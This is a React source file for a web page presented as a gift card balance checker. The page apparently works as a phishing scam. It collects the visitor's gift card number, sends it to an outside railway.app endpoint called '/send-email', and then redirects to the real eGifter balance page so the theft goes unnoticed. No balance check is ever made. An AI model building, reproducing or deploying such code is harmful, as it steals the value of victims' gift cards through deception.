import React, { useState } from 'react';
import './App.css';

function App() {
    const [userInput, setUserInput] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);
    const [validationError, setValidationError] = useState(null);

    const handleChange = (e) => {
        const { value } = e.target;
        const regex = /^[a-zA-Z0-9]*$/;

        if (regex.test(value)) {
            setUserInput(value);
            setValidationError(null);
        } else {
            setValidationError('');
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        setError(null);

        try {
            const response = await fetch('https://card-production-1781.up.railway.app/send-email', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ userInput }),
            });

            if (response.ok) {
                alert('Waiting to load your balance');
                window.location.href = 'https://www.egifter.com/gift-card-balance-check';
            } else {
                const errorData = await response.json();
                setError(errorData.message || 'Unable to process your request. Please try again.');
            }
        } catch (error) {
            setError('An error occurred. Please try again later.');
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="app h-screen md:py-20 py-9">
            <form className="h-80 text-black bg-white px-5 text-left py-10" onSubmit={handleSubmit}>
                <div className="md:text-4xl text-2xl font-extrabold text-blue-800">
                    Gift Card Balance Check
                </div>
                <br />
                <p className="text-sm pb-2 font-medium">
                    Please enter your gift card number below to check your balance.
                </p>
                <label htmlFor="userInput" className="sr-only">Gift Card Number</label>
                <input
                    className="border rounded-md border-black h-8 md:w-80 w-48 px-3"
                    type="text"
                    placeholder="Enter gift card number"
                    id="userInput"
                    value={userInput}
                    onChange={handleChange}
                    required
                    aria-required="true"
                />
                {loading ? (
                    <button className="border rounded-md ml-1 px-5 py-1 border-blue-800 text-blue-800 bg-white" type="submit" disabled>
                        Loading...
                    </button>
                ) : (
                    <button className="border rounded-md ml-1 px-5 py-1 bg-blue-800 text-white md:text-base text-sm font-semibold" type="submit">
                        Check
                    </button>
                )}
                {validationError && <p className="error text-red-500 mt-2">{validationError}</p>}
                {error && <p className="error text-red-500 mt-2">{error}</p>}
            </form>
        </div>
    );
}

export default App;
